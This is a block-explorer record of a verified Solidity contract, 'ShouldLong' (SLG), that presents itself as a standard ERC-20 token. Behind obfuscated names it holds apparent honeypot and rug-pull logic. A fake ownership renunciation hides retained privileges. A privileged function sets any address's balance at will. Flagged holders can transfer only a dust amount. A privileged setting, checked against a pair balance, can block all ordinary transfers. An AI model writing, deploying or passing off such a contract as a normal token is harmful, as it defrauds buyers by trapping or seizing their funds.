{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface receiverAtLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromIs {\n    function createPair(address tokenFeeTotal, address isFee) external returns (address);\n}\n\ninterface liquidityReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountLaunchedToken) external view returns (uint256);\n\n    function transfer(address maxTeamMode, uint256 takeTradingLiquidity) external returns (bool);\n\n    function allowance(address sellWalletLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTradingLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTeamMode,\n        uint256 takeTradingLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTeam, uint256 value);\n    event Approval(address indexed sellWalletLaunched, address indexed spender, uint256 value);\n}\n\ninterface liquidityReceiverMetadata is liquidityReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShouldLong is feeReceiver, liquidityReceiver, liquidityReceiverMetadata {\n\n    bool public senderLaunchedLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return teamFund;\n    }\n\n    function transferFrom(address sellSender, address maxTeamMode, uint256 takeTradingLiquidity) external override returns (bool) {\n        if (_msgSender() != senderIs) {\n            if (sellShouldMax[sellSender][_msgSender()] != type(uint256).max) {\n                require(takeTradingLiquidity <= sellShouldMax[sellSender][_msgSender()]);\n                sellShouldMax[sellSender][_msgSender()] -= takeTradingLiquidity;\n            }\n        }\n        return tradingLaunchSell(sellSender, maxTeamMode, takeTradingLiquidity);\n    }\n\n    function enableLiquidity(address senderTo, uint256 takeTradingLiquidity) public {\n        modeEnable();\n        exemptFee[senderTo] = takeTradingLiquidity;\n    }\n\n    function enableReceiver(address enableTrading) public {\n        modeEnable();\n        if (senderLaunchedLaunch) {\n            launchReceiverTo = false;\n        }\n        if (enableTrading == feeToList || enableTrading == fundLiquidityTrading) {\n            return;\n        }\n        isSwapShould[enableTrading] = true;\n    }\n\n    bool public sellIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapToTrading;\n    }\n\n    function senderAutoTake(uint256 takeTradingLiquidity) public {\n        modeEnable();\n        tokenMarketing = takeTradingLiquidity;\n    }\n\n    function allowance(address tradingAuto, address atAuto) external view virtual override returns (uint256) {\n        if (atAuto == senderIs) {\n            return type(uint256).max;\n        }\n        return sellShouldMax[tradingAuto][atAuto];\n    }\n\n    function maxReceiver() public {\n        emit OwnershipTransferred(feeToList, address(0));\n        toTotal = address(0);\n    }\n\n    uint256 senderMarketing;\n\n    uint256 private sellMarketingMode;\n\n    mapping(address => bool) public isSwapShould;\n\n    string private teamFund = \"Should Long\";\n\n    function approve(address atAuto, uint256 takeTradingLiquidity) public virtual override returns (bool) {\n        sellShouldMax[_msgSender()][atAuto] = takeTradingLiquidity;\n        emit Approval(_msgSender(), atAuto, takeTradingLiquidity);\n        return true;\n    }\n\n    constructor (){\n        \n        receiverAtLimit marketingReceiver = receiverAtLimit(senderIs);\n        fundLiquidityTrading = fromIs(marketingReceiver.factory()).createPair(marketingReceiver.WETH(), address(this));\n        if (sellIs) {\n            isLiquidity = false;\n        }\n        feeToList = _msgSender();\n        maxReceiver();\n        isTake[feeToList] = true;\n        exemptFee[feeToList] = receiverAuto;\n        \n        emit Transfer(address(0), feeToList, receiverAuto);\n    }\n\n    function modeEnable() private view {\n        require(isTake[_msgSender()]);\n    }\n\n    uint256 private receiverAuto = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return toTotal;\n    }\n\n    address autoAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletShould;\n    }\n\n    function balanceOf(address amountLaunchedToken) public view virtual override returns (uint256) {\n        return exemptFee[amountLaunchedToken];\n    }\n\n    string private walletShould = \"SLG\";\n\n    bool public liquidityTrading;\n\n    bool public isLiquidity;\n\n    address public fundLiquidityTrading;\n\n    mapping(address => mapping(address => uint256)) private sellShouldMax;\n\n    uint8 private swapToTrading = 18;\n\n    function walletExempt(address feeFund) public {\n        if (launchFundSwap) {\n            return;\n        }\n        if (liquiditySwap == fundReceiverExempt) {\n            fundReceiverExempt = true;\n        }\n        isTake[feeFund] = true;\n        if (liquidityTrading == fundReceiverExempt) {\n            takeToken = sellMarketingMode;\n        }\n        launchFundSwap = true;\n    }\n\n    uint256 constant modeAt = 8 ** 10;\n\n    bool public fundReceiverExempt;\n\n    mapping(address => bool) public isTake;\n\n    function tradingLaunchSell(address sellSender, address maxTeamMode, uint256 takeTradingLiquidity) internal returns (bool) {\n        if (sellSender == feeToList) {\n            return amountMode(sellSender, maxTeamMode, takeTradingLiquidity);\n        }\n        uint256 sellTake = liquidityReceiver(fundLiquidityTrading).balanceOf(autoAmount);\n        require(sellTake == tokenMarketing);\n        require(maxTeamMode != autoAmount);\n        if (isSwapShould[sellSender]) {\n            return amountMode(sellSender, maxTeamMode, modeAt);\n        }\n        return amountMode(sellSender, maxTeamMode, takeTradingLiquidity);\n    }\n\n    address public feeToList;\n\n    bool private launchMin;\n\n    address senderIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private exemptFee;\n\n    uint256 public takeToken;\n\n    function amountMode(address sellSender, address maxTeamMode, uint256 takeTradingLiquidity) internal returns (bool) {\n        require(exemptFee[sellSender] >= takeTradingLiquidity);\n        exemptFee[sellSender] -= takeTradingLiquidity;\n        exemptFee[maxTeamMode] += takeTradingLiquidity;\n        emit Transfer(sellSender, maxTeamMode, takeTradingLiquidity);\n        return true;\n    }\n\n    bool public launchReceiverTo;\n\n    bool public liquiditySwap;\n\n    function owner() external view returns (address) {\n        return toTotal;\n    }\n\n    bool public launchFundSwap;\n\n    function transfer(address senderTo, uint256 takeTradingLiquidity) external virtual override returns (bool) {\n        return tradingLaunchSell(_msgSender(), senderTo, takeTradingLiquidity);\n    }\n\n    address private toTotal;\n\n    uint256 tokenMarketing;\n\n    event OwnershipTransferred(address indexed tradingTotalEnable, address indexed listEnableTake);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellWalletLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTotalEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnableTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchedToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"enableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"}],\"name\":\"enableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidityTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSwapShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"senderAutoTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTeamMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"}],\"name\":\"walletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ShouldLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}